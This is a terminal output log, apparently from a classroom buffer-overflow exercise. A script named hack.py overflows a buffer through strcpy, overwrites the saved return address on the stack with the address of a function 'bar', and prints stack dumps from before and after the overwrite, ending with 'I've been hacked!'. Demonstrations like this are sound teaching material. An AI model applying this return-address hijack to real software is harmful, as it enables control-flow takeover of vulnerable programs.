$python hack.py
Address of foo = 0x80483d4
Address of bar = 0x8048419       //the adress of bar function
My stack looks like:
0xb7fc24e0
0x8048616
0xbf832484
0xbf832484
0xb7fc1ff4
0xbf832498
0x8048499            //the Address before strcpy 0x8048499

buf = ABCDEFGHIJKLMN�
Now the stack looks like:
0xbf83246e
0x8048616
0x42412484
0x46454443
0x4a494847
0x4e4d4c4b
0x8048419           //we have changed the function of bar 0x8048419

Augh! I've been hacked!    
